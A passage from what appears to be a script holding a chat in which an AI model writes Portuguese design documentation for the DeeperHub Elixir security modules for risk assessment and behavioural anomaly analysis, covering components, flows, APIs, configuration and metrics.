    *   Calcula fatores de risco mais complexos ou que dependem de an√°lise comportamental ou de padr√µes (ex: \"velocidade de viagem imposs√≠vel\", \"padr√£o de navega√ß√£o an√¥malo\").
    *   Pode interagir com `DeeperHub.Security.BehavioralAnalysis`.
5.  **`DeeperHub.Security.RiskAssessment.Services.RiskCalculatorService` (ou `RiskCalculator`):**
    *   Recebe os fatores de risco e seus valores.
    *   Aplica os pesos configurados (obtidos do `SecurityPolicyManager`).
    *   Calcula a pontua√ß√£o de risco final.
    *   Determina o n√≠vel de risco (low, medium, high, critical) com base em limiares.
6.  **`DeeperHub.Security.RiskAssessment.Services.RiskActionRecommender` (GenServer ou M√≥dulo Funcional):**
    *   Com base no n√≠vel de risco, tipo de opera√ß√£o e pol√≠ticas configuradas, recomenda a√ß√µes de seguran√ßa (ex: `:allow`, `:challenge_mfa`, `:block`).
7.  **`DeeperHub.Security.RiskAssessment.Services.RiskWeightCalibrator` (GenServer, Opcional):**
    *   Gerencia e ajusta os pesos dos fatores de risco.
8.  **`DeeperHub.Security.RiskAssessment.Metrics.RiskMetricsCollector` (GenServer):**
    *   Coleta e armazena m√©tricas relacionadas √†s avalia√ß√µes de risco.
9.  **Schemas (se persist√™ncia for usada para perfis/hist√≥rico):**
    *   `DeeperHub.Security.RiskAssessment.Schema.RiskProfile`
    *   `DeeperHub.Security.RiskAssessment.Schema.RiskAssessmentLog`
10. **Configura√ß√µes (via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`):**
    *   Pesos dos fatores de risco.
    *   Limiares para n√≠veis de risco.
    *   Regras para recomenda√ß√£o de a√ß√µes.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/security/risk_assessment/
‚îú‚îÄ‚îÄ risk_assessment.ex                # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îú‚îÄ‚îÄ default_risk_assessment_service.ex # Servi√ßo orquestrador
‚îÇ   ‚îú‚îÄ‚îÄ risk_factor_calculator.ex     # Calcula fatores b√°sicos
‚îÇ   ‚îú‚îÄ‚îÄ advanced_risk_factors.ex      # Calcula fatores avan√ßados
‚îÇ   ‚îú‚îÄ‚îÄ risk_calculator_service.ex    # Calcula score e n√≠vel
‚îÇ   ‚îú‚îÄ‚îÄ risk_action_recommender.ex    # Recomenda a√ß√µes
‚îÇ   ‚îî‚îÄ‚îÄ risk_weight_calibrator.ex     # (Opcional) Calibra pesos
‚îÇ
‚îú‚îÄ‚îÄ metrics/
‚îÇ   ‚îî‚îÄ‚îÄ risk_metrics_collector.ex     # Coleta m√©tricas de risco
‚îÇ
‚îú‚îÄ‚îÄ schemas/                          # Se houver persist√™ncia de perfis/logs
‚îÇ   ‚îú‚îÄ‚îÄ risk_profile.ex
‚îÇ   ‚îî‚îÄ‚îÄ risk_assessment_log.ex
‚îÇ
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex
```
*(O `RiskAssessmentAdapter` da documenta√ß√£o original pode ser a pr√≥pria fachada ou o `DefaultRiskAssessmentService` se ele implementar o behaviour.)*

### 3.3. Decis√µes de Design Importantes

*   **Abordagem Baseada em Fatores:** O risco √© calculado pela combina√ß√£o de m√∫ltiplos fatores, cada um com um peso configur√°vel.
*   **Granularidade:** Diferentes tipos de opera√ß√µes podem ter diferentes conjuntos de fatores de risco e pesos.
*   **Adaptabilidade:** O sistema deve ser capaz de aprender e adaptar os pesos dos fatores de risco ao longo do tempo (via `RiskWeightCalibrator` ou feedback manual).
*   **Transpar√™ncia (Opcional):** Capacidade de explicar por que uma determinada pontua√ß√£o de risco foi atribu√≠da (listando os fatores contribuintes).

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Login de Alto Risco:**
    *   Um usu√°rio tenta logar de um pa√≠s e dispositivo nunca antes vistos, fora do hor√°rio habitual.
    *   `RiskAssessment` calcula um score alto.
    *   `RiskActionRecommender` sugere `:require_mfa` e `:notify_user_unusual_login`.
    *   `DeeperHub.Auth` for√ßa o fluxo de MFA.
*   **Altera√ß√£o de Email de Baixo Risco:**
    *   Usu√°rio logado de um dispositivo confi√°vel e localiza√ß√£o comum altera seu email.
    *   `RiskAssessment` calcula um score baixo.
    *   `RiskActionRecommender` sugere `:allow` e `:notify_user_email_changed_confirm`.
    *   `DeeperHub.Accounts` permite a altera√ß√£o e envia um email de notifica√ß√£o.
*   **Transfer√™ncia Financeira Cr√≠tica:**
    *   Usu√°rio tenta realizar uma transfer√™ncia de valor muito alto para um novo destinat√°rio.
    *   `RiskAssessment` calcula um score cr√≠tico.
    *   `RiskActionRecommender` sugere `:block_temporarily_and_require_manual_review`.
    *   O m√≥dulo de transa√ß√µes bloqueia a opera√ß√£o e a encaminha para revis√£o.

## üåä 5. Fluxos Importantes

### Fluxo de Avalia√ß√£o de Risco para uma Tentativa de Login

1.  **`DeeperHub.Auth` (ou `SecurityManager`):** Chama `RiskAssessment.assess_login_risk(user_id, context_info, opts)`.
2.  **`DefaultRiskAssessmentService`:**
    *   Obt√©m o perfil de risco do usu√°rio (`get_risk_profile`).
    *   Chama `RiskFactorCalculator.calculate_login_risk_factors(user_id, context_info, profile)` para obter fatores como:
        *   Reputa√ß√£o do IP.
        *   Dispositivo conhecido/novo.
        *   Localiza√ß√£o conhecida/nova.
        *   Dist√¢ncia/velocidade desde o √∫ltimo login.
        *   Hist√≥rico de tentativas falhas recentes.
    *   Chama `AdvancedRiskFactors.evaluate_advanced_factors(context_info, user_id, :login)` para obter fatores como:
        *   An√°lise de padr√£o de comportamento de login (hor√°rio, frequ√™ncia).
    *   Agrega todos os fatores de risco.
3.  **`RiskCalculatorService`:**
    *   Recebe a lista de fatores e seus valores.
    *   Obt√©m os pesos dos fatores e os limiares de n√≠vel de risco do `SecurityPolicyManager`.
    *   Calcula a pontua√ß√£o de risco final.
    *   Determina o n√≠vel de risco (ex: `:high`).
4.  **`RiskActionRecommender`:**
    *   Recebe o n√≠vel de risco `:high` e o tipo de opera√ß√£o `:login`.
    *   Consulta as pol√≠ticas para determinar as a√ß√µes recomendadas (ex: `[:require_mfa, :notify_user]`).
5.  **`DefaultRiskAssessmentService`:**
    *   (Opcional) Persiste o log da avalia√ß√£o.
    *   Retorna `{:ok, %{risk_score: 78.5, risk_level: :high, recommended_actions: [:require_mfa, :notify_user], factors: [...]}}` para o chamador.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Security.RiskAssessment`)

### 6.1. `DeeperHub.Security.RiskAssessment.assess_risk(user_id :: String.t() | nil, operation_type :: atom(), operation_data :: map(), context_data :: map()) :: {:ok, RiskAssessmentResult.t()} | {:error, term()}`

*   **Descri√ß√£o:** Fun√ß√£o gen√©rica para avaliar o risco de qualquer opera√ß√£o.
*   **`operation_type`:** Um √°tomo identificando a opera√ß√£o (ex: `:login`, `:profile_email_change`, `:fund_transfer`, `:api_sensitive_read`).
*   **`operation_data`:** Dados espec√≠ficos da opera√ß√£o (ex: para `:fund_transfer`, `%{amount: 1000, recipient_id: \"xyz\"}`).
*   **`context_data`:** Informa√ß√µes contextuais (IP, dispositivo, sess√£o, etc.).
*   **`RiskAssessmentResult.t()`:** `%{risk_score: float(), risk_level: atom(), recommended_actions: list(atom()), contributing_factors: list(map()), assessment_id: String.t()}`.
*   **Exemplo:**
    ```elixir
    op_data = %{new_email: \"new@example.com\"}
    context = %{ip_address: \"1.2.3.4\", device_id: \"dev_abc\"}
    RiskAssessment.assess_risk(\"user1\", :profile_email_change, op_data, context)
    ```

### 6.2. Fun√ß√µes Espec√≠ficas (atalhos para `assess_risk/4`):

*   `assess_login_risk(user_id, context_data, opts \\\\ [])`
*   `assess_profile_change_risk(user_id, changes_map, context_data, opts \\\\ [])`
*   `assess_transaction_risk(user_id, transaction_details, context_data, opts \\\\ [])`
*   `assess_api_request_risk(client_id_or_api_key, request_details, context_data, opts \\\\ [])`
*   `assess_session_risk(session_id, context_data, opts \\\\ [])`
*   `assess_action_risk(user_id, action_atom, action_params, context_data, opts \\\\ [])`

### 6.3. `DeeperHub.Security.RiskAssessment.get_risk_profile(user_id :: String.t(), opts :: keyword()) :: {:ok, UserRiskProfile.t()} | {:error, :not_found | term()}`

*   **Descri√ß√£o:** Obt√©m o perfil de risco consolidado para um usu√°rio.
*   **`UserRiskProfile.t()`:** Um mapa com scores de risco m√©dios hist√≥ricos, padr√µes comportamentais, etc.

### 6.4. `DeeperHub.Security.RiskAssessment.update_risk_profile(user_id :: String.t(), assessment_result :: RiskAssessmentResult.t(), opts :: keyword()) :: :ok | {:error, term()}`

*   **Descri√ß√£o:** Atualiza o perfil de risco de um usu√°rio com base em uma nova avalia√ß√£o. (Chamado internamente ou por um processo de feedback).

## ‚öôÔ∏è 7. Configura√ß√£o

Configura√ß√µes gerenciadas pelo `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :risk_assessment, :enabled]`** (Boolean): Habilita/desabilita o sistema de avalia√ß√£o de risco. (Padr√£o: `true`)
*   **`[:security, :risk_assessment, :default_risk_factors_weights]`** (Map): Pesos padr√£o para diferentes fatores de risco (ex: `%{ip_reputation: 0.2, device_novelty: 0.3, location_anomaly: 0.4, behavioral_score: 0.5}`).
*   **`[:security, :risk_assessment, :risk_level_thresholds]`** (Map): Limiares para definir n√≠veis de risco (ex: `%{low: 0..20, medium: 21..50, high: 51..75, critical: 76..100}`).
*   **`[:security, :risk_assessment, :action_recommendation_rules]`** (List de Maps): Regras para recomendar a√ß√µes com base no risco e tipo de opera√ß√£o (ex: `%{operation_type: :login, risk_level: :high, actions: [:require_mfa]}`).
*   **`[:security, :risk_assessment, :advanced_factors_enabled]`** (Boolean): Habilita o uso de fatores de risco avan√ßados. (Padr√£o: `true`)
*   **`[:security, :risk_assessment, :profile_update_frequency_hours]`** (Integer): Com que frequ√™ncia os perfis de risco do usu√°rio devem ser recalculados em background. (Padr√£o: `24`)
*   **`[:security, :risk_assessment, :assessment_log_retention_days]`** (Integer): Por quantos dias manter os logs de avalia√ß√£o de risco. (Padr√£o: `90`)

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`, `Core.Repo` (se persistir logs/perfis).
*   `DeeperHub.Security.Policy.SecurityPolicyManager`: Para obter pesos, limiares e regras de a√ß√£o.
*   `DeeperHub.Security.LoginLocation`: Para dados de geolocaliza√ß√£o e hist√≥rico de login.
*   `DeeperHub.Security.DeviceFingerprint`: Para informa√ß√µes de dispositivo.
*   `DeeperHub.Security.BehavioralAnalysis`: Para scores de anomalia comportamental.
*   `DeeperHub.Security.FraudDetection`: Pode consumir resultados de RiskAssessment ou fornecer insumos.
*   `DeeperHub.Accounts`: Para obter dados do usu√°rio.
*   `DeeperHub.MFA`: Para recomendar ou verificar MFA.

### 8.2. Bibliotecas Externas

*   Bibliotecas para c√°lculo estat√≠stico ou ML, se usadas em `AdvancedRiskFactors`.

## ü§ù 9. Como Usar / Integra√ß√£o

M√≥dulos que realizam opera√ß√µes sens√≠veis devem chamar `RiskAssessment.assess_risk/4` (ou uma de suas variantes espec√≠ficas) antes de prosseguir.

**Exemplo em um servi√ßo de transa√ß√µes:**
```elixir
defmodule DeeperHub.Finance.TransactionService do
  alias DeeperHub.Security.RiskAssessment

  def create_transfer(user_id, recipient_id, amount, context_info) do
    operation_data = %{recipient_id: recipient_id, amount: amount}
    
    case RiskAssessment.assess_risk(user_id, :fund_transfer, operation_data, context_info) do
      {:ok, %{recommended_actions: actions}} ->
        cond do
          :block in actions ->
            {:error, :transfer_blocked_high_risk}
          :require_mfa in actions ->
            # Iniciar fluxo de MFA antes de prosseguir
            {:error, :mfa_required_for_transfer}
          :allow in actions ->
            # ... L√≥gica para realizar a transfer√™ncia ...
            {:ok, \"Transfer√™ncia iniciada\"}
          true ->
            # Pol√≠tica de nega√ß√£o padr√£o se nenhuma a√ß√£o clara for :allow
            {:error, :transfer_denied_policy}
        end
      {:error, reason} ->
        Logger.error(\"Erro na avalia√ß√£o de risco da transfer√™ncia: #{inspect(reason)}\")
        {:error, :risk_assessment_failed} # Falhar seguro
    end
  end
end
```

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o c√°lculo de scores de risco para diferentes combina√ß√µes de fatores e pesos.
*   Testar a classifica√ß√£o correta dos n√≠veis de risco com base nos limiares.
*   Testar a l√≥gica de recomenda√ß√£o de a√ß√µes para diferentes cen√°rios de risco e opera√ß√£o.
*   Testar a atualiza√ß√£o e consulta de perfis de risco de usu√°rio.
*   Simular diferentes contextos (IPs novos/conhecidos, dispositivos novos/confi√°veis) e verificar os scores resultantes.
*   Localiza√ß√£o: `test/deeper_hub/security/risk_assessment/`.

### 10.2. M√©tricas

*   `deeper_hub.security.risk_assessment.assessments.count` (tags: `operation_type`, `risk_level_calculated`)
*   `deeper_hub.security.risk_assessment.assessment.duration_ms` (Histograma, tags: `operation_type`)
*   `deeper_hub.security.risk_assessment.risk_score.distribution` (Histograma, tags: `operation_type`): Distribui√ß√£o das pontua√ß√µes de risco.
*   `deeper_hub.security.risk_assessment.actions_recommended.count` (tags: `operation_type`, `action` (`allow`, `block`, `mfa`))
*   `deeper_hub.security.risk_assessment.profile.updates.count` (Contador)

### 10.3. Logs

*   **N√≠vel INFO:** Avalia√ß√µes de risco bem-sucedidas com score, n√≠vel e fatores contribuintes (especialmente para riscos n√£o baixos). A√ß√µes recomendadas.
*   **N√≠vel WARNING:** Fatores de risco significativos detectados, mesmo que a pontua√ß√£o final n√£o seja cr√≠tica.
*   **N√≠vel ERROR:** Falhas no processo de avalia√ß√£o de risco, incapacidade de obter dados necess√°rios para c√°lculo.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :risk_assessment, :evaluation, :start | :stop | :exception]`
    *   Metadados: `%{operation_type: type, user_id: id, input_context_keys: keys(context)}`
    *   No `:stop`: `%{risk_score: score, risk_level: level, recommended_actions: actions, contributing_factors: factors}`
*   `[:deeper_hub, :security, :risk_assessment, :profile, :updated]`
    *   Metadados: `%{user_id: id, old_avg_score: old, new_avg_score: new}`

## ‚ùå 11. Tratamento de Erros

*   Se a avalia√ß√£o de risco falhar por um erro interno, o sistema deve, por padr√£o, adotar uma postura mais segura (ex: negar a opera√ß√£o ou exigir verifica√ß√£o m√°xima).
*   Falhas na obten√ß√£o de dados de um dos subsistemas (ex: `LoginLocation` indispon√≠vel) devem ser tratadas graciosamente, possivelmente resultando em um score de risco \"indeterminado\" ou usando fatores padr√£o.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa (do pr√≥prio M√≥dulo)

*   **Prote√ß√£o das Pol√≠ticas:** As pol√≠ticas de risco (pesos, limiares, regras de a√ß√£o) s√£o cr√≠ticas e devem ser protegidas contra modifica√ß√µes n√£o autorizadas (via `SecurityPolicyManager`).
*   **Feedback Loop:** O sistema deve ter mecanismos para ajustar os pesos e regras com base em falsos positivos/negativos reportados por analistas.
*   **Privacidade dos Dados:** Os dados usados para avalia√ß√£o de risco e os perfis de risco podem ser sens√≠veis. O acesso a eles deve ser controlado.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Novos fatores de risco devem ser bem definidos, testados e ter um impacto claro e justific√°vel no score de risco.
*   A l√≥gica de c√°lculo de score e recomenda√ß√£o de a√ß√£o deve ser transparente e, se poss√≠vel, explic√°vel.
*   Considere a performance ao adicionar novos fatores que exigem consultas complexas.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar aprendizado de m√°quina para ajustar dinamicamente os pesos dos fatores de risco e detectar novos padr√µes de risco.
*   [ ] Adicionar uma UI para visualizar perfis de risco de usu√°rios e o hist√≥rico de avalia√ß√µes.
*   [ ] Permitir simula√ß√£o de \"what-if\" para testar o impacto de diferentes configura√ß√µes de pol√≠ticas de risco.
*   [ ] Integra√ß√£o com sistemas de \"User and Entity Behavior Analytics\" (UEBA) externos.
*   [ ] Desenvolver modelos de risco espec√≠ficos para diferentes segmentos de usu√°rios ou tipos de conta.

---

*√öltima atualiza√ß√£o: 2025-05-11*

---

Este m√≥dulo √© um orquestrador complexo que se baseia em muitos outros para funcionar.

Onde vamos agora? Talvez `DeeperHub.Security.BehavioralAnalysis` que √© um forte alimentador do `RiskAssessment`? Ou um m√≥dulo mais simples do Core como `DeeperHub.Core.Cache`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos explorar o `DeeperHub.Security.BehavioralAnalysis`. Este m√≥dulo adiciona uma camada sofisticada de seguran√ßa, aprendendo os padr√µes de comportamento dos usu√°rios para detectar atividades anormais.

---

# M√≥dulo: `DeeperHub.Security.BehavioralAnalysis` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Security.BehavioralAnalysis`

O m√≥dulo `DeeperHub.Security.BehavioralAnalysis` √© dedicado a analisar os padr√µes de comportamento dos usu√°rios ao longo do tempo para construir perfis individuais e detectar desvios que possam indicar comprometimento de conta, fraude ou outras atividades maliciosas. Ele vai al√©m das regras est√°ticas, aprendendo o \"normal\" para cada usu√°rio e sinalizando atividades que fogem desse padr√£o.

Este m√≥dulo coleta e processa uma variedade de eventos de usu√°rio, como padr√µes de login (hor√°rios, dispositivos, localiza√ß√µes), padr√µes de navega√ß√£o na interface, tipos de transa√ß√µes realizadas e at√© mesmo padr√µes de digita√ß√£o (se integrado com `DeeperHub.Biometrics`). O objetivo √© identificar anomalias sutis que seriam dif√≠ceis de capturar com regras de seguran√ßa tradicionais. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Coleta de Eventos de Comportamento:**
    *   Receber e registrar eventos de comportamento de v√°rias partes do sistema (via `record_behavior_event/4`).
    *   Eventos t√≠picos: login, logout, visualiza√ß√£o de p√°gina, execu√ß√£o de a√ß√£o, transa√ß√£o, uso de API, etc.
*   **Constru√ß√£o de Perfis Comportamentais de Usu√°rio:**
    *   Processar eventos hist√≥ricos para construir e manter um perfil de comportamento individual para cada usu√°rio (`get_user_profile/2`, `update_user_profile/2`).
    *   O perfil pode incluir:
        *   Hor√°rios de login e atividade t√≠picos.
        *   Dispositivos e endere√ßos IP frequentemente usados.
        *   Localiza√ß√µes geogr√°ficas comuns.
        *   Padr√µes de navega√ß√£o (sequ√™ncia de p√°ginas, tempo em p√°gina).
        *   Tipos e valores de transa√ß√µes comuns.
        *   Frequ√™ncia de certas a√ß√µes.
*   **An√°lise de Comportamento e Detec√ß√£o de Anomalias:**
    *   Analisar o comportamento recente de um usu√°rio em compara√ß√£o com seu perfil estabelecido (`analyze_user_behavior/2`).
    *   Detectar anomalias em tempo real √† medida que novos eventos ocorrem (`detect_realtime_anomaly/3`).
    *   Identificar padr√µes temporais (ex: picos de atividade incomuns) (`detect_temporal_patterns/2`).
*   **Pontua√ß√£o de Anomalia:**
    *   Atribuir uma pontua√ß√£o de anomalia a comportamentos desviantes.
    *   Fornecer detalhes sobre quais aspectos do comportamento foram considerados an√¥malos.
*   **Integra√ß√£o com `RiskAssessment` e `FraudDetection`:**
    *   Fornecer scores de anomalia comportamental como um fator de risco para outros sistemas de seguran√ßa.
*   **Gerenciamento de Modelos (Opcional, se ML for usado):**
    *   Treinar e atualizar modelos de aprendizado de m√°quina para detec√ß√£o de anomalias comportamentais.
*   **Configurabilidade:**
    *   Permitir a configura√ß√£o de sensibilidade da detec√ß√£o, janelas de tempo para an√°lise e quais caracter√≠sticas comportamentais monitorar.
*   **Observabilidade:**
    *   Registrar m√©tricas e logs sobre eventos processados, perfis constru√≠dos e anomalias detectadas.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.BehavioralAnalysis` (Fachada P√∫blica):**
    *   Ponto de entrada para registrar eventos e solicitar an√°lises.
    *   Delega para o `BehavioralAnalysisService`.
2.  **`DeeperHub.Security.BehavioralAnalysis.Services.DefaultBehavioralAnalysisService` (GenServer ou Servi√ßo Coordenador):**
    *   Orquestra a coleta, processamento e an√°lise de dados comportamentais.
    *   Interage com o `EventStore` (para eventos de comportamento), `ProfileStore` (para perfis), `PatternAnalysisService` e `AnomalyDetectionService`.
3.  **`DeeperHub.Security.BehavioralAnalysis.Services.EventStore` (Adapter/Behaviour):**
    *   **Responsabilidade:** Armazenar e recuperar eventos de comportamento brutos.
    *   **Implementa√ß√£o:** Pode ser uma tabela Ecto, um sistema de s√©ries temporais, ou integrado com o `Core.EventBus` se os eventos relevantes j√° passarem por l√°.
4.  **`DeeperHub.Security.BehavioralAnalysis.Services.ProfileStore` (Adapter/Behaviour):**
    *   **Responsabilidade:** Armazenar e recuperar os perfis comportamentais constru√≠dos para cada usu√°rio.
    *   **Implementa√ß√£o:** Pode ser uma tabela Ecto ou um armazenamento NoSQL otimizado para perfis.
5.  **`DeeperHub.Security.BehavioralAnalysis.Services.PatternAnalysisService` (M√≥dulo Funcional):**
    *   Cont√©m algoritmos para extrair e identificar padr√µes dos dados de comportamento (ex: `extract_login_patterns`, `detect_temporal_patterns`).
6.  **`DeeperHub.Security.BehavioralAnalysis.Services.AnomalyDetectionService` (M√≥dulo Funcional ou ML Model Service):**
    *   Cont√©m algoritmos para comparar o comportamento atual com o perfil e detectar anomalias (ex: `analyze_events` para an√°lise em lote, `analyze_realtime_event`).
    *   Pode usar m√©todos estat√≠sticos (Z-score, desvio padr√£o) ou modelos de aprendizado de m√°quina (ex: Isolation Forest, Autoencoders).
7.  **`DeeperHub.Security.BehavioralAnalysis.Schemas.BehaviorProfileSchema` (Ecto Schema):**
    *   Define a estrutura para armazenar os perfis comportamentais.
8.  **`DeeperHub.Security.BehavioralAnalysis.Schemas.BehaviorEventSchema` (Ecto Schema, opcional):**
    *   Define a estrutura para armazenar os eventos de comportamento brutos, se um `EventStore` baseado em Ecto for usado.
9.  **Workers (Opcional):**
    *   `ProfileBuilderWorker`: Para construir ou reconstruir perfis em background.
    *   `BatchAnalysisWorker`: Para an√°lises de anomalias em lote sobre dados hist√≥ricos.
10. **Configura√ß√µes (via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`):**
    *   Limiares de anomalia, janelas de tempo, pesos de caracter√≠sticas.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/security/behavioral_analysis/
‚îú‚îÄ‚îÄ behavioral_analysis.ex           # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îú‚îÄ‚îÄ default_behavioral_analysis_service.ex # Servi√ßo orquestrador
‚îÇ   ‚îú‚îÄ‚îÄ pattern_analysis_service.ex
‚îÇ   ‚îú‚îÄ‚îÄ anomaly_detection_service.ex
‚îÇ   ‚îú‚îÄ‚îÄ event_store_adapter.ex        # Behaviour para armazenamento de eventos
‚îÇ   ‚îî‚îÄ‚îÄ profile_store_adapter.ex      # Behaviour para armazenamento de perfis
‚îÇ
‚îú‚îÄ‚îÄ storage_implementations/          # Implementa√ß√µes concretas dos StoreAdapters
‚îÇ   ‚îú‚îÄ‚îÄ ecto_event_store.ex
‚îÇ   ‚îî‚îÄ‚îÄ ecto_profile_store.ex
‚îÇ
‚îú‚îÄ‚îÄ schemas/
‚îÇ   ‚îú‚îÄ‚îÄ behavior_profile_schema.ex
‚îÇ   ‚îî‚îÄ‚îÄ behavior_event_schema.ex      # Se usado
‚îÇ
‚îú‚îÄ‚îÄ workers/                          # Opcional
‚îÇ   ‚îú‚îÄ‚îÄ profile_builder_worker.ex
‚îÇ   ‚îî‚îÄ‚îÄ batch_analysis_worker.ex
‚îÇ
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex
```
*(O `BehavioralAnalysisAdapter` da documenta√ß√£o original pode ser a pr√≥pria fachada ou o `DefaultBehavioralAnalysisService`)*

### 3.3. Decis√µes de Design Importantes

*   **Privacidade dos Dados:** A coleta e an√°lise de comportamento do usu√°rio devem ser feitas com considera√ß√µes de privacidade e, idealmente, com consentimento do usu√°rio. Os dados devem ser anonimizados ou pseudoanonimizados sempre que poss√≠vel.
*   **Evolu√ß√£o do Perfil:** Os perfis de comportamento devem ser din√¢micos e capazes de se adaptar gradualmente a mudan√ßas leg√≠timas no comportamento do usu√°rio, para evitar falsos positivos.
*   **Explicabilidade (XAI):** Para anomalias detectadas, especialmente se baseadas em ML, √© √∫til ter alguma forma de explicar por que um comportamento foi considerado an√¥malo.
*   **Compromisso entre Detec√ß√£o e Falsos Positivos:** Ajustar a sensibilidade do sistema √© crucial. Uma sensibilidade muito alta pode gerar muitos falsos positivos, irritando os usu√°rios.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Detec√ß√£o de Login An√¥malo:**
    *   Usu√°rio normalmente faz login de S√£o Paulo entre 9h-18h em dias √∫teis usando Chrome em um desktop.
    *   Uma tentativa de login ocorre √†s 3h da manh√£ de um domingo, de um pa√≠s diferente, usando um navegador mobile nunca antes visto para esse usu√°rio.
    *   `BehavioralAnalysis` sinaliza m√∫ltiplos desvios do perfil normal, resultando em um alto score de anomalia.
*   **Detec√ß√£o de Navega√ß√£o Incomum:**
    *   Um usu√°rio que normalmente apenas visualiza perfis e l√™ artigos, de repente come√ßa a tentar acessar endpoints de administra√ß√£o ou realizar exclus√µes em massa.
    *   `BehavioralAnalysis` detecta um desvio significativo nos padr√µes de navega√ß√£o e tipos de a√ß√£o.
*   **Identifica√ß√£o de Conta Comprometida:**
    *   Ap√≥s um login (potencialmente j√° sinalizado como de risco), o \"usu√°rio\" come√ßa a realizar a√ß√µes muito diferentes do perfil estabelecido (ex: alterar rapidamente email, senha, configura√ß√µes de seguran√ßa; tentar transfer√™ncias para novos destinat√°rios).
    *   `BehavioralAnalysis` contribui com um alto score de anomalia para o `RiskAssessment`, que pode levar ao bloqueio da sess√£o e notifica√ß√£o.

## üåä 5. Fluxos Importantes

### Fluxo de Registro e Processamento de Evento Comportamental

1.  **M√≥dulo de Dom√≠nio:** Realiza uma a√ß√£o (ex: `DeeperHub.Accounts` processa um login).
2.  **Registro do Evento:** O m√≥dulo de dom√≠nio chama `DeeperHub.Security.BehavioralAnalysis.record_behavior_event(user_id, :login, %{ip: \"...\", device_type: \"...\"}, context)`.
3.  **`DefaultBehavioralAnalysisService`:**
    *   Recebe o evento.
    *   Chama o `EventStore` para persistir o evento bruto.
    *   **An√°lise em Tempo Real (Opcional):** Pode chamar `AnomalyDetectionService.analyze_realtime_event(user_id, event_data)` para uma verifica√ß√£o imediata. Se uma anomalia for detectada, pode publicar um evento ou notificar `RiskAssessment`.
    *   **Atualiza√ß√£o de Perfil Ass√≠ncrona (Opcional):** Pode enfileirar uma tarefa para o `ProfileBuilderWorker` atualizar o perfil do usu√°rio com base no novo evento.
4.  **`ProfileBuilderWorker` (Ass√≠ncrono):**
    *   Recupera eventos recentes para o usu√°rio do `EventStore`.
    *   Chama `PatternAnalysisService` para extrair/atualizar padr√µes (ex: hor√°rios de login, dispositivos comuns).
    *   Atualiza o `BehaviorProfileSchema` do usu√°rio no `ProfileStore`.

### Fluxo de An√°lise Peri√≥dica de Anomalias (em lote)

1.  **`BatchAnalysisWorker` (Agendado):** Inicia sua execu√ß√£o.
2.  Para cada usu√°rio (ou um subconjunto):
    *   Recupera o perfil comportamental do `ProfileStore`.
    *   Recupera eventos recentes do `EventStore` para um determinado per√≠odo.
    *   Chama `AnomalyDetectionService.analyze_events(events, profile, opts)`.
    *   Se anomalias significativas forem encontradas:
        *   Registra as anomalias (ex: em uma tabela de \"anomalias comportamentais\" ou atualizando o `BehaviorProfileSchema`).
        *   Publica um evento `behavioral_anomaly_detected` no `Core.EventBus`.
        *   Notifica o `DeeperHub.Security.Monitoring` ou `RiskAssessment`.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada)

### 6.1. `DeeperHub.Security.BehavioralAnalysis.record_behavior_event(user_id :: String.t(), event_type :: atom(), event_data :: map(), context :: map() | nil) :: :ok | {:error, term()}`

*   **Descri√ß√£o:** Registra um evento de comportamento do usu√°rio para an√°lise subsequente.
*   **`event_type`:** Ex: `:login_success`, `:login_failure`, `:page_view`, `:profile_update_attempt`, `:transaction_initiated`, `:api_call`.
*   **`event_data`:** Mapa com dados espec√≠ficos do evento (ex: para `:page_view`, `%{path: \"/settings\", duration_ms: 5000}`).
*   **`context`:** Informa√ß√µes como IP, User-Agent, Session ID.
*   **Retorno:** `:ok` se o evento foi aceito para processamento.

### 6.2. `DeeperHub.Security.BehavioralAnalysis.analyze_user_behavior(user_id :: String.t(), opts :: keyword()) :: {:ok, AnomalyReport.t()} | {:error, term()}`

*   **Descri√ß√£o:** Realiza uma an√°lise sob demanda do comportamento recente de um usu√°rio em compara√ß√£o com seu perfil.
*   **`opts`:**
    *   `:time_window_hours` (Integer): Janela de tempo para buscar eventos recentes.
    *   `:sensitivity` (Float): N√≠vel de sensibilidade para detec√ß√£o de anomalias (0.0 a 1.0).
*   **`AnomalyReport.t()`:** `%{user_id: String.t(), anomaly_score: float(), anomalies_detected: list(map()), profile_confidence: float()}`.

### 6.3. `DeeperHub.Security.BehavioralAnalysis.get_user_behavioral_profile(user_id :: String.t()) :: {:ok, BehaviorProfile.t()} | {:error, :not_found | term()}`

*   **Descri√ß√£o:** Recupera o perfil comportamental consolidado de um usu√°rio.
*   **`BehaviorProfile.t()`:** `%{common_login_times: list(), common_devices: list(), typical_navigation_paths: list(), ...}`.

